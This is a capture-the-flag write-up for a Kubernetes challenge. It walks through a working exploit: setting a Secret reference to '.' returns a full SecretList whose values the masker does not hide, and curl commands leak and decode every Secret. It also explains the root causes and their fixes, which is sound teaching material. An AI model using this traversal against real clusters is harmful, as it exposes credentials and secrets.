# Challenge Deployment 2

**Category:** misc (kubernetes) · **Points:** 98 · **Solves:** 70 · **Author:** p4ck3t0

## Challenge

The sequel to *Challenge Deployment*: the same challenge-tracker application, but
the permissions handed to the player have been tightened. The instance gives you
a kubeconfig for the `ctf` namespace and the UI is reachable only through the
API server's service proxy.

Handout: `challenge-deployment-2.tar.gz` — the three services (`controller.py`,
`api.py`, `ui.py`), `common.py`, the manifests `challenge.yaml` and `user.yaml`,
`Dockerfile`, `kind.sh`, `build.sh`.

## TL;DR

`pods` and `pods/portforward` are gone; the only way into the cluster is
`services/proxy` for `http:ui:80`, i.e. the web form. That form takes a
`flagRef` string and the controller later uses it as a Secret name —
unquoted — in a Kubernetes API path. Setting `flagRef` to `.` makes the "get one
Secret" call resolve to the *collection* URL, so the API server returns a
`SecretList`. `mask_secret()` only masks when the object has a top-level `data`
dict, and a list has none, so every Secret in the namespace comes back with its
base64 payload, including the unreferenced one holding the real flag.

## Files

| file | description |
|---|---|
| `controller.py` | the only pod with a service account; `/debug`, `/apply`, `/flags`, `/challenges` |
| `api.py` | template fetching/rendering, `flagRef` injection, flag creation |
| `ui.py` | the Flask UI on port 8080 (the only thing you can reach) |
| `common.py` | constants: `NAMESPACE`, CRD group/kind, `MASK = "***"`, template hosts |
| `challenge.yaml` | CRD, deployments, controller RBAC, 10 Secrets, 9 demo Challenges |
| `user.yaml` | **changed here**: `services/proxy` + `services get` on `ui` only |
| `kind.sh`, `build.sh`, `Dockerfile` | local rebuild |

Tools: `kubectl`, `curl`, `base64`. `controller.py`, `api.py` and `ui.py` are
byte-identical to the first challenge; the only difference is `user.yaml`:

```yaml
# v1
  - resources: ["pods"]              verbs: ["get", "list"]
  - resources: ["pods/portforward"]  verbs: ["create", "get"]

# v2
  - resources: ["services/proxy"]    verbs: ["get", "create"]
    resourceNames: ["ui", "http:ui:80"]
  - resources: ["services"]          verbs: ["get"]
    resourceNames: ["ui"]
```

## Analysis

### The entry point is the API server proxy

With no `pods/portforward` and no `pods`, `kubectl port-forward` and
`kubectl exec` are both dead. What remains is the built-in
`services/proxy` subresource, which lets the API server reverse-proxy a request
to the service:

```bash
kubectl proxy --port=8080 &
curl -s http://127.0.0.1:8080/api/v1/namespaces/ctf/services/http:ui:80/proxy/
```

`http:ui:80` is the service-proxy naming convention (`http:<service>:<port>`),
and both that name and the plain service name `ui` are in the role. So the UI is
reachable, and nothing else is — every path is a request to `ui:80`.

### The UI forwards `flagRef` into the Challenge CR

`ui.py`:

```python
@app.post("/create")
def ui_create():
    values = {k[3:]: v for k, v in request.form.items() if k.startswith("ph_")}
    data, st = api_post("/api/create", {"template": request.form.get("template", ""),
                                        "values": values,
                                        "flagRef": request.form.get("flagRef", ""),
                                        "newFlag": request.form.get("newFlag", "")})
```

and `api.py`:

```python
def inject_flag_ref(text, flag_ref):
    docs = [d for d in yaml.safe_load_all(text) if d is not None]
    for doc in docs:
        if isinstance(doc, dict) and doc.get("kind") == KIND:
            doc.setdefault("spec", {})["flagRef"] = flag_ref
```

So a form field becomes `spec.flagRef` on the object that is applied to the
cluster. `normalize_challenge()` only requires it to be a string.

### `flagRef` becomes an unquoted API path

`controller.py` `debug_view()`:

```python
ref = (challenge.get("spec") or {}).get("flagRef")
if ref:
    secret = secrets.get(name=ref, namespace=NAMESPACE).to_dict()
    parts.append(dump_resource(mask_secret(secret)))
```

The Kubernetes Python client interpolates `name` into
`/api/v1/namespaces/ctf/secrets/{name}` without escaping it (`kubernetes/client/api/core_v1_api.py`,
`.../secrets/{name}`), and the API server normalises dot segments in the request
path. `name="."` therefore yields

```
/api/v1/namespaces/ctf/secrets/.
```

which the API server resolves to the collection endpoint and answers with a
`SecretList` instead of a single `Secret`.

### The mask only looks at one key

```python
def mask_secret(obj):
    obj = copy.deepcopy(obj)
    for field in ("data", "stringData"):
        if isinstance(obj.get(field), dict):
            obj[field] = {key: MASK for key in obj[field]}
    return obj
```

A `SecretList` is `{"kind": "SecretList", "items": [...], "metadata": {...}}` — no
top-level `data`, so the loop does nothing and `dump_resource()` serialises the
whole list, each item with its `data` intact.

### The tenth Secret

`challenge.yaml` defines ten Secrets; the nine demo Challenges reference nine of
them, all holding `flag{FAKE}`. The tenth, `6c057691-9a9d-49ea-aaea-cbe69f20b46f`,
is referenced by nothing and is the one the deployed instance fills with the real
flag.

## Solution

### 1. Start the proxy

```bash
export KUBECONFIG=$PWD/kubeconfig.yaml
kubectl proxy --port=8080 &
P=http://127.0.0.1:8080/api/v1/namespaces/ctf/services/http:ui:80/proxy
curl -s "$P/" | head -20
```

observed: the tracker's index page (`Vaultboard`). If you would rather script it,
the same request can be sent straight to the API server URL with
`-H "Authorization: Bearer $TOK" -k`.

### 2. Create a challenge whose flag reference is `.`

`template=web` is one of the five built-in template sources; `ph_*` fields fill
the template's placeholders. `flagRef` is forwarded verbatim.

```bash
curl -s -i -X POST "$P/create" \
  --data-urlencode template=web \
  --data-urlencode ph_title=lk2 \
  --data-urlencode ph_description=d \
  --data-urlencode "flagRef=." | head -5
```

observed: `302 Found` back to the board. The template has no `spec.id`, so the
controller generates one (`cid = spec.get("id") or f"c-{uuid.uuid4().hex[:8]}"`).
Read the name off the board:

```bash
curl -s "$P/" | grep -o 'c-[0-9a-f]\{8\}' | sort -u
```

observed (this instance): `c-dcb83d9e`.

### 3. Dump the debug view

```bash
NAME=c-dcb83d9e
curl -s "$P/debug?name=$NAME" -o debug.html
grep -c 'kind: SecretList' debug.html
```

observed: the page contains the Challenge plus a `kind: SecretList` document with
ten `items`, each carrying `data: {flag: <base64>}` (with a normal `flagRef` you
would get a single masked Secret — `data: {flag: '***'}`).

### 4. Decode the flags

```bash
grep -oE 'flag: [A-Za-z0-9+/=]+' debug.html | awk '{print $2}' | sort -u | \
  while read -r b; do printf '%-40s %s\n' "$b" "$(printf %s "$b" | base64 -d)"; done
```

observed:

```
ZmxhZ3tGQUtFfQ==                         flag{FAKE}
<base64 of the real flag>                flag{n0w_y0u_n33d3d_t0_d0_th3_DNS_tr1ck}
```

Nine entries decode to the placeholder; the single other one is the flag.

## Flag

```
flag{n0w_y0u_n33d3d_t0_d0_th3_DNS_tr1ck}
```

## Notes

### About the flag text

The flag hints at a DNS-based route. Our working solve did not need one: the
`flagRef` traversal above is enough. The handout does have a DNS-flavoured
surface — one we did not manage to turn into a working stage:
`POST /api/templates` registers a template source whose host only has to end in
`.cluster.local`, and `api.py` then fetches `http://<host>/template.yaml` **from
the api pod**, so any in-cluster name becomes reachable. Every attempt along that
line only produced fetch errors, so it is not claimed as a working stage here.

### Why the traversal works at all

Two independent mistakes line up:

1. The Secret name is never quoted or validated: Kubernetes names are DNS
   labels, so refusing anything outside `[a-z0-9.-]` would have sufficed;
   instead the string is concatenated into a URL path, and `.` is a legal
   segment that the API server normalises away.
2. The masker is written against a single object and reused for whatever the
   client returns; a list is a type it never considers.

Either fix alone stops the leak: quote the name, or mask over `items[]`.

### Other dead ends

The raw-YAML branch of `/api/create` is unreachable from the UI: `ui_create` always
sends `template` as a non-`None` string, so `api_create` always renders a template
and substitutes placeholders *after* parsing YAML — no YAML injection there. No
`pods`/`pods/portforward`, and `services/proxy` only for `ui`: nothing else opens.
